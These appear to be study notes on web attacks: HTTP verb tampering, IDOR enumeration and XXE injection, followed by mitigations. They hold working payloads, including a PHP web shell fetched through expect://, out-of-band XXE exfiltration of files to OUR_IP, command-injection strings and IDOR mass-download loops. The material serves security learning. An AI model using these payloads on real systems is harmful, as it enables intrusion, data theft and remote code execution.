# Web Attacks

## 🎯 Main Idea
- Covers three common web attacks: HTTP Verb Tampering, IDOR, and XXE Injection.
- Goal: bypass authorization/security filters, access other users' data, and disclose local files / achieve RCE.
- All three stem from misconfigurations or missing back-end access control / input handling.

## 💥 Attack / Exploit Vectors

### HTTP Verb Tampering — Bypass Basic Auth (Insecure Config)
- Auth config limited to specific verbs (`<Limit GET POST>`) leaves other methods unprotected.
- Try alternate verbs (HEAD, PUT, DELETE, OPTIONS, PATCH) to reach restricted functions.
- **Commands**
  - `curl -i -X OPTIONS http://SERVER_IP:PORT/` — list allowed methods (`Allow:` header)
  - Burp "Change Request Method" → switch GET/POST → HEAD to trigger `/admin/reset.php`

### HTTP Verb Tampering — Bypass Security Filters (Insecure Coding)
- Filter checks only one method (e.g. `$_POST`) while action uses `$_REQUEST` — switch verb to evade.
- **Commands**
  - Change POST→GET in Burp so `$_POST` filter is empty but `$_REQUEST` still runs command
  - `file1; touch file2;` — confirm command injection succeeds after verb-tamper bypass

### IDOR — Identifying Direct Object References
- Look in URL params, APIs, AJAX calls, cookies; compare user roles; understand hashing/encoding.
- **Commands**
  - `?uid=2`, `?filename=file_2.pdf` — increment/change reference to access others' data
  - `base64 -d` — decode encoded references (e.g. `ZmlsZV8xMjMucGRm` → `file_123.pdf`)
  - `md5sum` — test if reference is a hash of known values

### IDOR — Mass Enumeration (static/clear-text refs)
- Loop over IDs to download all resources via a script.
- **Commands**
  - `curl -s "$url/documents.php?uid=3" | grep -oP "/documents.*?.pdf"` — extract file links
  - `for i in {1..10}; do ... wget -q $url/$link; done` — mass download all employees' docs

### IDOR — Bypassing Encoded/Hashed References
- Reverse front-end hashing when function is disclosed in JS (CryptoJS, btoa).
- **Commands**
  - `echo -n 1 | md5sum` — test plain md5 of uid
  - `echo -n 1 | base64 -w 0 | md5sum` — replicate `CryptoJS.MD5(btoa(uid))` (note `-n`/`-w 0`)
  - `for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done` — compute all hashes
  - `curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php` — mass download contracts

### IDOR — Insecure APIs (Function Calls)
- Client-controlled params (uid, uuid, role, role cookie) manipulated to act as/modify other users.
- Methods: PUT=update, POST=create, DELETE=delete, GET=read.
- Back-end checks `uid`/`uuid` mismatch; creating/deleting gated by `role` cookie.

### IDOR — Chaining Vulnerabilities
- GET request on API leaks other users' details (Information Disclosure) → get their uuid.
- Use leaked uuid to PUT-modify their profile; enumerate all users to find admin role (`web_admin`).
- Set own role to `web_admin` (no back-end check) → create/delete users, mass-assign (XSS in `about`, change emails).
- Follow-on: change victim email → password reset → account takeover.

### XXE — Local File Disclosure
- Web app parses user XML with outdated library; inject external entity to read files.
- Confirm by defining internal entity and seeing it reflected.
- **Commands**
  - `<!DOCTYPE email [ <!ENTITY company "Inlane Freight"> ]>` + `&company;` — confirm entity injection
  - `<!ENTITY xxe SYSTEM "file:///etc/passwd">` — read local file
  - `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` — read PHP source (base64)
  - Change `Content-Type` to `application/xml` if app defaults to JSON

### XXE — Remote Code Execution
- Via ssh keys, Windows hash stealing, or PHP `expect://` module (if enabled).
- **Commands**
  - `echo '<?php system($_REQUEST["cmd"]);?>' > shell.php; sudo python3 -m http.server 80`
  - `<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">` — fetch web shell (use `$IFS` for spaces)

### XXE — Advanced File Disclosure (CDATA)
- Wrap non-XML-conforming content in CDATA using external parameter entities (joined via external DTD).
- **Commands**
  - `echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd; python3 -m http.server 8000`
  - DTD payload defines `%begin "<![CDATA["`, `%file SYSTEM "file:///..."`, `%end "]]>"`, references `%xxe;`

### XXE — Error-Based (semi-blind)
- When no entity is reflected but runtime errors show; force error that leaks file content.
- **Commands**
  - `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` — leak file via error message
  - Send malformed XML (e.g. `<roo>`) to trigger error / reveal web root

### XXE — Blind OOB Data Exfiltration
- No output, no errors: make server send file content to attacker server.
- **Commands**
  - `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` — OOB exfil
  - `<?php if(isset($_GET['content'])){ error_log(base64_decode($_GET['content'])); }` — receiver script
  - `php -S 0.0.0.0:8000` — host listener
  - `ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter` — automated

### XXE — Denial of Service
- Billion laughs / entity self-reference loop (`&a10;`) exhausts memory (blocked by modern servers).

## 🛠️ Key Tools & Concepts
- curl — set HTTP methods (`-X`), mass download
- Burp Suite / ZAP — intercept, Change Request Method, Intruder/Fuzzer, Comparer, Inspector
- md5sum / base64 — reverse encoded/hashed object references
- XXEinjector — automate XXE (CDATA, error-based, blind OOB)
- XML concepts: DTD, internal/external entities, parameter entities (`%`), CDATA, SYSTEM/PUBLIC
- php://filter, file://, expect:// wrappers

## 🛡️ Mitigations
- Verb Tampering: never restrict auth to specific verbs; use `LimitExcept`/`http-method-omission`; test all params (`$_REQUEST`); disable HEAD if unneeded; consistent HTTP method use.
- IDOR: implement back-end object-level access control (RBAC) mapped from session token, not client input; use strong refs (UUID v4, salted hashes); never hash on front-end.
- XXE: update XML libraries/parsers (avoid deprecated `libxml_disable_entity_loader`); disable custom DTDs, external entities, parameter entities, XInclude, entity loops; disable runtime errors; prefer JSON/YAML over XML/SOAP; use WAF as extra layer.
